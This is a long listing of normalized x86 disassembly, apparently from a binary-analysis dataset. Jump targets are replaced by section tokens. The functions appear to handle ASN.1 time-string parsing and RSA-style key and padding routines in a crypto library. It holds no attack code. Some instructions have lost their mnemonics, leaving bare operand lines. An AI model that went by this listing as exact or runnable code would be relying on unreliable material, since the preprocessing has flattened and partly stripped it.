jg r-xdata
mov cl [ eax + edi + 0x1 ]
inc eax
cmp cl 0x30
jge r-xdata
cmp ecx [ esi * 4 + rw-data ]
jg r-xdata
movsx ecx cl
mov dl [ eax + edi + 0x1 ]
sub ecx 0x30
inc eax
cmp dl 0x30
jl r-xdata
inc esi
cmp esi 0x7
jl r-xdata
cmp dl 0x39
jg r-xdata
cmp esi 0x6
jne r-xdata
movsx edx dl
lea ecx [ ecx + ecx * 4 ]
lea ecx [ edx + ecx * 2 - 0x30 ]
mov edx [ esi + rw-data ]
cmp ecx edx
jl r-xdata
cmp ecx [ esi + rw-data ]
jg r-xdata
add esi 0x4
inc eax
cmp esi 0x8
jl r-xdata
mov cl [ eax + edi ]
cmp cl 0x30
jl r-xdata
sub_10048540
mov eax 0x24
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x30 ]
push edi
test esi esi
jne r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x38 ]
push eax
push ecx
call sub_10058d60
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
push 0x18
call sub_1002edc0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x24
retn
pop edi
pop esi
pop ebx
add esp 0x24
retn
push 0xe2
push r--data
push 0x14
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
cmp [ esi ] 0x14
jae r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push 0xe6
push r--data
push 0x41
push 0xb9
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x24
retn
mov edx [ ebx ]
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
push edx
mov edx [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push ecx
mov ecx [ ebx + 0x14 ]
inc eax
push edx
add ecx 0x76c
push eax
push ecx
push r--data
push 0x14
push edi
call sub_100279b0
or ecx 0xffffffff
xor eax eax
add esp 0x24
[ edi ]
not ecx
dec ecx
mov [ esi + 0x4 ] 0x18
mov [ esi ] ecx
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x24
retn
mov [ esi + 0x8 ] edi
push eax
call sub_1001d740
add esp 0x4
sub_10048640
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
cmp [ eax + 0x4 ] 0x17
je r-xdata
mov ebx [ eax ]
mov edi [ eax + 0x8 ]
xor eax eax
cmp ebx 0xb
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
xor esi esi
mov cl [ eax + edi ]
cmp cl 0x30
jl r-xdata
mov cl [ eax + edi ]
cmp cl 0x5a
je r-xdata
cmp cl 0x39
jg r-xdata
mov cl [ eax + edi ]
cmp cl 0x5a
jne r-xdata
cmp cl 0x2b
je r-xdata
movsx ecx cl
sub ecx 0x30
inc eax
cmp eax ebx
jg r-xdata
cmp cl 0x2b
je r-xdata
inc eax
xor ecx ecx
cmp eax ebx
pop edi
sete cl
pop esi
mov eax ecx
pop ebx
retn
cmp cl 0x2d
je r-xdata
mov dl [ eax + edi ]
cmp dl 0x30
jl r-xdata
inc eax
lea ecx [ eax + 0x4 ]
cmp ecx ebx
jg r-xdata
cmp cl 0x2d
jne r-xdata
cmp dl 0x39
jg r-xdata
xor esi esi
xor ecx ecx
cmp eax ebx
sete cl
pop edi
pop esi
mov eax ecx
pop ebx
retn
movsx edx dl
lea ecx [ ecx + ecx * 4 ]
inc eax
cmp eax ebx
lea ecx [ edx + ecx * 2 - 0x30 ]
jg r-xdata
cmp cl 0x39
jg r-xdata
cmp ecx [ esi * 4 + rw-data ]
jl r-xdata
movsx ecx cl
mov dl [ eax + edi + 0x1 ]
sub ecx 0x30
inc eax
cmp dl 0x30
jl r-xdata
cmp ecx [ esi * 4 + rw-data ]
jg r-xdata
cmp dl 0x39
jg r-xdata
inc esi
cmp esi 0x6
jl r-xdata
movsx edx dl
lea ecx [ ecx + ecx * 4 ]
lea ecx [ edx + ecx * 2 - 0x30 ]
mov edx [ esi + rw-data ]
cmp ecx edx
jl r-xdata
cmp esi 0x5
jne r-xdata
cmp ecx [ esi + rw-data ]
jg r-xdata
add esi 0x4
inc eax
cmp esi 0x8
jl r-xdata
mov cl [ eax + edi ]
cmp cl 0x30
jl r-xdata
sub_10048760
mov eax 0x24
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x30 ]
push edi
test esi esi
jne r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x38 ]
push eax
push ecx
call sub_10058d60
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
push 0x17
call sub_1002edc0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x24
retn
pop edi
pop esi
pop ebx
add esp 0x24
retn
push 0xce
push r--data
push 0x14
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
cmp [ esi ] 0x14
jae r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push 0xd1
push r--data
push 0x41
push 0xbb
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x24
retn
mov edx [ ebx ]
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
push edx
mov edx [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push ecx
inc eax
push edx
push eax
mov eax [ ebx + 0x14 ]
cdq
mov ecx 0x64
idiv ecx
push edx
push r--data
push 0x14
push edi
call sub_100279b0
or ecx 0xffffffff
xor eax eax
add esp 0x24
[ edi ]
not ecx
dec ecx
mov [ esi + 0x4 ] 0x17
mov [ esi ] ecx
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x24
retn
mov [ esi + 0x8 ] edi
push eax
call sub_1001d740
add esp 0x4
sub_10048860
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn
mov eax [ edi + 0xc ]
push ebx
push esi
push eax
call sub_1001e780
mov ecx [ edi + 0x10 ]
push sub_10048900
push ecx
call sub_1001e730
mov eax [ edi + 0x4 ]
mov esi [ edi ]
add esp 0xc
xor ebx ebx
test eax eax
jle r-xdata
mov eax [ edi + 0x8 ]
pop esi
test eax eax
pop ebx
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov edx [ edi ]
push edx
call sub_1001d740
push edi
call sub_1001d740
add esp 0x8
push sub_10052180
push eax
call sub_1001e730
add esp 0x8
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_10022870
add esp 0x4
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push sub_10058f50
push eax
call sub_1001e730
add esp 0x8
mov eax [ edi + 0x4 ]
inc ebx
add esi 0x10
cmp ebx eax
jl r-xdata
push eax
call sub_10058f50
add esp 0x4
sub_10048920
mov eax 0x14
call sub_1001d0d0
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
push ebx
push ebp
push esi
xor ebp ebp
push edi
mov [ eax ] ebp
push edx
mov [ esp + 0x20 ] ebp
mov [ ecx ] ebp
mov ebx 0x1
call sub_1001e7b0
mov ecx eax
mov eax [ esp + 0x3c ]
or ah 0x4
add esp 0x4
test bl ah
mov [ esp + 0x18 ] ecx
je r-xdata
lea edx [ ecx + 0x1 ]
mov [ esp + 0x38 ] edx
mov [ esp + 0x38 ] ebp
jmp r-xdata
lea edx [ ecx + 0x1 ]
mov [ esp + 0x10 ] edx
mov [ esp + 0x10 ] ebp
jmp r-xdata
test ah 0x2
je r-xdata
lea eax [ ecx + 0x1 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x14 ] ebp
jmp r-xdata
test ah 0x4
je r-xdata
lea eax [ ecx - 0x2 ]
mov edi eax
mov [ esp + 0x20 ] eax
cmp edi ebp
jl r-xdata
mov eax ecx
jmp r-xdata
cmp ecx 0x1
jne r-xdata
push 0x97
push r--data
push 0x18
call sub_1001d4c0
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov ecx [ esp + 0x30 ]
push edi
push ecx
call sub_1001e7c0
mov esi eax
push 0xffffffff
push 0xffffffff
push esi
call sub_10023a40
push esi
call sub_100351b0
add esp 0x18
test eax eax
je r-xdata
jmp [ eax * 4 + r-xdata ]
mov esi [ esp + 0x18 ]
push 0x9d
shl esi 0x4
push r--data
push esi
mov [ ebx + 0x14 ] 0x0
call sub_1001d4c0
mov ecx esi
mov edi eax
xor edx edx
xor eax eax
shr ecx 0x2
mov [ ebx ] edi
mov [ ebx + 0x8 ] edx
mov [ ebx + 0xc ] edx
mov [ ebx + 0x10 ] edx
[ edi ]
mov ecx esi
add esp 0xc
and ecx 0x3
[ edi ]
mov eax [ esp + 0x18 ]
mov edi [ ebx ]
push edx
push 0x2ea
mov [ ebx + 0x4 ] eax
call sub_10022900
add esp 0x4
push eax
push 0x0
call sub_100521d0
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x28 ]
test ch 0x8
je r-xdata
push ebx
call sub_10048860
add esp 0x4
push ebx
push 0x0
push eax
push edi
call sub_10058e70
add esp 0x10
test eax eax
je r-xdata
cmp ebx 0x1
jne r-xdata
or ebx 0xffffffff
jmp r-xdata
mov eax [ esp + 0x20 ]
test eax eax
mov [ esp + 0x18 ] eax
jl r-xdata
mov edx [ esp + 0x38 ]
test edx edx
jle r-xdata
mov edx [ eax + 0x4 ]
test edx edx
jne r-xdata
mov eax [ esp + 0x38 ]
mov ebp ebx
neg eax
sbb eax eax
and al 0xfc
add eax 0x5
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x30 ]
push ecx
push edx
add edi 0x10
call sub_1001e7c0
mov esi eax
push esi
call sub_100351b0
push 0xbc
mov ebp eax
push r--data
push 0x3
lea eax [ esi + 0x10 ]
push 0x1
push eax
call sub_1001f5f0
mov [ edi ] esi
mov eax [ ebp ]
add esp 0x20
test eax eax
jne r-xdata
dec edi
jns r-xdata
test cl 0x20
jne r-xdata
mov ebx 0x2
mov ecx [ esp + 0x10 ]
mov al [ esi + 0x28 ]
test ecx ecx
jne r-xdata
mov eax [ edi + 0xc ]
or ah 0x2
mov [ edi + 0xc ] eax
cmp ebx 0x1
je r-xdata
mov eax [ eax + 0x10 ]
cmp eax 0xffffffff
je r-xdata
dec edx
mov [ esp + 0x38 ] edx
test al 0x20
jne r-xdata
test al 0x20
je r-xdata
cmp ebx 0x2
jne r-xdata
cmp eax edx
jge r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jl r-xdata
dec ecx
mov [ esp + 0x10 ] ecx
mov eax [ edi + 0xc ]
or ah 0x2
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
cmp ebx 0x6
mov eax ebx
ja r-xdata
test edx edx
jne r-xdata
mov edx eax
mov [ esp + 0x38 ] edx
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
cmp eax ecx
jge r-xdata
push ebp
call sub_10048860
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov eax 0x6
jmp r-xdata
mov ebp [ ebp + 0x14 ]
dec eax
test ebp ebp
mov [ esp + 0x14 ] eax
jl r-xdata
mov eax [ edi + 0xc ]
or ah 0x4
mov [ edi + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x18 ]
dec eax
mov [ esp + 0x18 ] eax
jns r-xdata
cmp ebp eax
jge r-xdata
mov [ esp + 0x14 ] ebp
sub_10048dd0
mov eax [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov ecx [ eax + 0x4 ]
push esi
push edi
push ecx
lea ebx [ ebp - 0x10 ]
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov edx [ esp + 0x18 ]
push edi
mov eax [ edx + 0x4 ]
push eax
call sub_1001e7c0
mov esi eax
add esp 0x8
test [ esi ] 0x2
je r-xdata
mov ecx [ esi + 0x4 ]
push ecx
push ebx
call sub_10058e20
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
test ah 0x2
je r-xdata
push 0x0
push eax
push esi
push ebp
call sub_10058e70
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
inc edi
mov eax [ edx + 0x4 ]
push eax
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_10048e60
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov eax [ ebx - 0xc ]
push edi
push eax
xor ebp ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ ebx - 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebx - 0xc ]
push ebp
push ecx
call sub_1001e7c0
mov edi eax
add esp 0x8
mov eax [ edi + 0x8 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push 0x0
push eax
mov eax [ esp + 0x20 ]
mov ecx [ eax ]
push ecx
push ebx
call sub_10058e70
add esp 0x10
test eax eax
jne r-xdata
mov edx [ ebx - 0xc ]
inc ebp
push edx
call sub_1001e7b0
add esp 0x4
cmp ebp eax
jl r-xdata
mov eax [ edi ]
mov edx [ eax ]
mov eax [ eax + 0x4 ]
and edx 0x10
push edx
push eax
push 0x0
call sub_100521d0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ecx [ esp + 0x18 ]
mov edx [ ecx ]
mov ecx [ esp + 0x1c ]
push ecx
push edi
mov eax [ edx + 0x8 ]
push esi
mov [ esi + 0x8 ] eax
mov eax [ esi ]
or al 0x4
push ebx
mov [ esi ] eax
call sub_10058e70
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_10052180
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10048f30
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov eax [ esi + 0x4 ]
push eax
call sub_1001e7b0
mov edi eax
add esp 0x4
dec edi
js r-xdata
mov ebp [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
push edi
push ecx
call sub_1001e7c0
mov edx [ eax ]
add esp 0x8
test [ edx ] 0x3
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0x4 ]
push edi
push edx
call sub_1001e7c0
mov ecx [ eax + 0x8 ]
add esp 0x8
test ecx ecx
jne r-xdata
dec edi
jns r-xdata
mov ecx [ eax + 0x4 ]
push eax
dec [ ecx + 0x8 ]
call sub_1001d740
mov eax [ esi + 0x4 ]
push edi
push eax
call sub_1001e5d0
add esp 0xc
cmp esi [ ebp ]
jne r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
dec edi
jns r-xdata
mov ecx [ eax + 0x4 ]
push eax
dec [ ecx + 0x8 ]
call sub_1001d740
mov eax [ esi + 0x4 ]
push edi
push eax
call sub_1001e5d0
add esp 0xc
mov ecx [ esi - 0xc ]
sub esi 0x10
push ecx
call sub_1001e7b0
mov edi eax
add esp 0x4
dec edi
js r-xdata
mov eax [ esi + 0x8 ]
pop edi
neg eax
sbb eax eax
pop esi
add eax 0x2
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
push ecx
call sub_1001d740
add esp 0x4
mov [ esi + 0x8 ] 0x0
dec [ eax + 0x8 ]
sub_10049000
mov eax 0xc
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
mov eax [ ebx + 0x4 ]
mov ecx [ ebx ]
shl eax 0x4
push edi
mov esi [ eax + ecx - 0x8 ]
lea eax [ eax + ecx - 0x10 ]
test esi esi
je r-xdata
lea ebp [ ebx + 0xc ]
mov [ esp + 0x10 ] ebp
mov edi ebp
mov eax [ ebx + 0xc ]
lea edi [ ebx + 0xc ]
test eax eax
mov [ esp + 0x10 ] edi
jne r-xdata
mov eax [ esp + 0x24 ]
cmp ebp eax
jne r-xdata
lea edi [ eax + 0x4 ]
push esi
push eax
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
call sub_10058d90
test eax eax
mov [ edi ] eax
je r-xdata
mov ecx [ edi ]
pop edi
pop esi
mov [ eax ] ecx
pop ebp
mov eax 0x1
pop ebx
add esp 0xc
retn
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
add esp 0xc
retn
mov edi [ esp + 0x10 ]
mov eax [ edi + 0x10 ]
add edi 0x10
push eax
xor ebx ebx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov ebp [ esp + 0x24 ]
jmp r-xdata
mov edx [ edi ]
push esi
push edx
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
jmp r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x14 ]
inc eax
mov ecx [ edx + 0x4 ]
mov [ esp + 0x14 ] eax
cmp eax ecx
jl r-xdata
mov ecx [ edi ]
push ebx
push ecx
call sub_1001e7c0
mov edx [ esp + 0x20 ]
mov esi eax
add esp 0x8
cmp [ esi + 0x4 ] edx
jne r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
mov ecx 0x1
cmp edx ecx
mov [ esp + 0x14 ] ecx
jle r-xdata
mov eax [ edi + 0x4 ]
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
mov ecx [ edi ]
inc ebx
push ecx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov eax [ ebp ]
test eax eax
jne r-xdata
push esi
push eax
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
call sub_10058d90
test eax eax
mov [ ebp ] eax
je r-xdata
mov eax [ ebp ]
push esi
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
sub_10049160
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
push ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov edi [ esp + 0x14 ]
push ebp
xor esi esi
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
shl eax 0x4
mov ebx [ eax + ecx - 0x8 ]
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push ebp
mov [ esp + 0x1c ] 0x0
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push esi
push ebp
call sub_1001e7c0
push eax
call sub_10022ae0
add esp 0xc
cmp eax 0x2ea
je r-xdata
mov edx [ esp + 0x18 ]
push edx
push ebp
call sub_1001e7c0
mov edi eax
mov eax [ esp + 0x24 ]
push edi
push eax
call sub_10058dd0
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
mov eax [ edi + 0x14 ]
or al 0x2
mov [ edi + 0x14 ] eax
push ebp
inc esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov edi [ esp + 0x14 ]
test ebx ebx
je r-xdata
mov edx [ edi + 0x10 ]
push esi
push edx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
call sub_1001e3c0
test eax eax
mov [ edi + 0x10 ] eax
je r-xdata
mov esi [ esp + 0x18 ]
push ebp
inc esi
mov [ esp + 0x1c ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov ecx [ ebx ]
mov edx [ ecx ]
and edx 0x10
push edx
push edi
push eax
call sub_100521d0
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ecx [ ebx ]
mov edi [ esp + 0x14 ]
push edi
mov edx [ ecx + 0x8 ]
mov [ eax ] 0xc
mov [ eax + 0x8 ] edx
mov ecx [ ebx + 0x4 ]
push ecx
push eax
push esi
call sub_10058e70
add esp 0x10
mov esi eax
jmp r-xdata
mov eax [ edi + 0x10 ]
test eax eax
jne r-xdata
sub_100492c0
mov eax 0xc
call sub_1001d0d0
mov ecx [ esp + 0x18 ]
mov [ esp ] 0x0
test ecx ecx
jne r-xdata
lea eax [ ecx + 0x7 ]
push ebx
cdq
and edx 0x7
push ebp
add eax edx
lea ebx [ ecx - 0x1 ]
mov ebp eax
push esi
sar ebp 0x3
and ebx 0x80000007
jns r-xdata
mov eax [ esp + 0x14 ]
push ecx
push eax
call sub_10029cf0
add esp 0x8
mov eax 0x1
add esp 0xc
retn
lea ecx [ ebx + 0x1 ]
mov eax 0xff
shl eax cl
push 0x86
push r--data
push ebp
mov [ esp + 0x20 ] eax
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
dec ebx
or ebx 0xfffffff8
inc ebx
lea ecx [ esp + 0x10 ]
push edi
push ecx
call time
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push 0x4
push edx
call sub_10021890
mov edi [ esp + 0x34 ]
add esp 0x14
test edi edi
push ebp
push esi
je r-xdata
push 0x89
push r--data
push 0x41
push 0x7f
push 0x3
call sub_1001de60
mov eax [ esp + 0x20 ]
add esp 0x14
pop esi
pop ebp
pop ebx
add esp 0xc
retn
call sub_10021900
add esp 0x8
test eax eax
jle r-xdata
call sub_10021970
add esp 0x8
cmp eax 0xffffffff
je r-xdata
push ebp
push esi
call sub_10026870
push esi
call sub_1001d740
mov eax [ esp + 0x1c ]
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
jmp r-xdata
cmp edi 0x2
jne r-xdata
mov eax [ esp + 0x2c ]
cmp eax 0xffffffff
je r-xdata
xor edi edi
test ebp ebp
jle r-xdata
mov al [ esp + 0x18 ]
mov cl [ esi ]
not al
and cl al
mov eax [ esp + 0x30 ]
test eax eax
mov [ esi ] cl
je r-xdata
test eax eax
je r-xdata
lea eax [ esp + 0x28 ]
push 0x1
push eax
call sub_10021970
mov al [ esp + 0x30 ]
add esp 0x8
cmp al 0x80
jb r-xdata
mov ecx [ esp + 0x24 ]
push ecx
push ebp
push esi
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
or [ esi + ebp - 0x1 ] 0x1
mov al 0x1
mov ecx ebx
shl al cl
or [ esi ] al
test ebx ebx
jne r-xdata
cmp al 0x2a
jae r-xdata
test edi edi
jle r-xdata
mov [ esp + 0x10 ] 0x1
mov al [ esi ]
lea ecx [ ebx - 0x1 ]
mov dl 0x3
shl dl cl
or al dl
mov [ esi ] al
jmp r-xdata
mov al [ esi + 0x1 ]
mov [ esi ] 0x1
or al 0x80
mov [ esi + 0x1 ] al
jmp r-xdata
cmp al 0x54
jae r-xdata
mov [ edi + esi ] 0x0
jmp r-xdata
mov cl [ edi + esi - 0x1 ]
mov [ edi + esi ] cl
jmp r-xdata
inc edi
cmp edi ebp
jl r-xdata
mov [ edi + esi ] 0xff
sub_100494c0
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
test eax eax
push edi
mov ebp sub_10049480
jne r-xdata
mov edi [ esp + 0x1c ]
mov [ esp + 0x14 ] 0x64
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
mov ebp sub_100492a0
push 0xee
push r--data
push 0x73
push 0x7a
push 0x3
call sub_1001de60
add esp 0x14
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push edi
call sub_10029870
mov esi eax
add esp 0x4
cmp esi 0x1
jne r-xdata
lea ecx [ esi - 0x2 ]
push ecx
push edi
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
push 0x0
push eax
call sub_10029cf0
add esp 0x8
mov ebx [ esp + 0x18 ]
push 0x0
push 0xffffffff
push esi
push ebx
call ebp
add esp 0x10
test eax eax
je r-xdata
lea edx [ esi - 0x3 ]
push edx
push edi
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ esp + 0x14 ]
dec eax
mov [ esp + 0x14 ] eax
je r-xdata
lea ebx [ esi + 0x1 ]
mov esi [ esp + 0x18 ]
push eax
push 0xffffffff
push ebx
push esi
call ebp
add esp 0x10
test eax eax
je r-xdata
push 0x11d
push r--data
push 0x71
push 0x7a
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push edi
push ebx
call sub_1002a000
add esp 0x8
test eax eax
jl r-xdata
push edi
push esi
call sub_1002a000
add esp 0x8
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push 0x0
push 0xffffffff
push esi
push ebx
call ebp
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
dec eax
mov [ esp + 0x14 ] eax
je r-xdata
push edi
push esi
push esi
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x10d
push r--data
push 0x71
push 0x7a
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push edi
push esi
call sub_1002a000
add esp 0x8
test eax eax
jl r-xdata
push edi
push esi
call sub_1002a000
add esp 0x8
test eax eax
jl r-xdata
push 0x0
push 0xffffffff
push ebx
push esi
call ebp
add esp 0x10
test eax eax
jne r-xdata
push edi
push esi
push esi
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10049690
mov eax 0x8
call sub_1001d0d0
push edi
mov edi [ esp + 0x1c ]
mov [ esp + 0x8 ] 0xffffffff
mov eax [ edi + 0x10 ]
push eax
call sub_10029870
add esp 0x4
cmp eax 0x4000
jle r-xdata
mov ecx [ edi + 0x14 ]
mov edx [ edi + 0x10 ]
push ecx
push edx
call sub_10029fb0
add esp 0x8
test eax eax
jg r-xdata
push 0xa3
push r--data
push 0x69
push 0x68
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
add esp 0x8
retn
mov eax [ edi + 0x10 ]
push eax
call sub_10029870
add esp 0x4
cmp eax 0xc00
jle r-xdata
push 0xa9
jmp r-xdata
push ebx
push ebp
push esi
call sub_1002dc50
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ edi + 0x14 ]
push ecx
call sub_10029870
add esp 0x4
cmp eax 0x40
jle r-xdata
push r--data
push 0x65
push 0x68
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
add esp 0x8
retn
mov eax [ esp + 0x14 ]
pop esi
pop ebp
pop ebx
pop edi
add esp 0x8
retn
push ebx
call sub_1002dd20
push ebx
call sub_1002de70
push ebx
mov [ esp + 0x34 ] eax
call sub_1002de70
mov edx [ edi + 0x10 ]
mov [ esp + 0x1c ] eax
push edx
call sub_10029870
add eax 0x7
push 0xbc
cdq
and edx 0x7
push r--data
add eax edx
mov esi eax
sar esi 0x3
push esi
call sub_1001d4c0
mov ebp eax
mov eax [ esp + 0x44 ]
add esp 0x1c
test eax eax
je r-xdata
push 0xb2
push 0xbf
push r--data
push 0x41
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push esi
push ebp
call sub_10026870
push ebp
call sub_1001d740
add esp 0xc
test ebp ebp
je r-xdata
mov eax [ esp + 0x2c ]
dec eax
cmp eax 0x3
ja r-xdata
push 0xd4
push r--data
push 0x76
jmp r-xdata
jmp [ eax * 4 + jump_table_10049944 ]
push 0x68
push 0x4
call sub_1001de60
add esp 0x14
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
push ecx
push edx
push esi
push ebp
call sub_10059870
jmp r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
push 0x0
push 0x0
push eax
push ecx
push esi
push ebp
call sub_10059210
add esp 0x18
jmp r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x20 ]
push edx
push eax
push esi
push ebp
call sub_10059050
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
push ecx
push edx
push esi
push ebp
call sub_10058f80
add esp 0x10
test eax eax
jle r-xdata
push ebx
call sub_1002de00
push ebx
call sub_1002dcb0
add esp 0x8
test ebp ebp
je r-xdata
mov eax [ esp + 0x28 ]
push eax
push esi
push ebp
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
mov ecx [ edi + 0x10 ]
mov edx [ esp + 0x28 ]
push ecx
push edx
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
test [ edi + 0x3c ] 0x2
je r-xdata
push 0xde
push r--data
push 0x84
jmp r-xdata
mov eax [ edi + 0x40 ]
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
mov edi [ esp + 0x14 ]
push ebx
push ecx
mov ecx [ esp + 0x34 ]
push eax
push ecx
push edi
call [ edx + 0x18 ]
add esp 0x18
test eax eax
je r-xdata
mov eax [ edi + 0x10 ]
push ebx
push eax
lea ecx [ edi + 0x40 ]
push 0x9
push ecx
call sub_1004c5e0
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_10029870
add eax 0x7
cdq
and edx 0x7
add eax edx
mov edx esi
sar eax 0x3
sub edx eax
mov eax [ esp + 0x28 ]
add edx eax
push edx
push edi
call sub_10029ef0
mov ecx esi
add esp 0xc
sub ecx eax
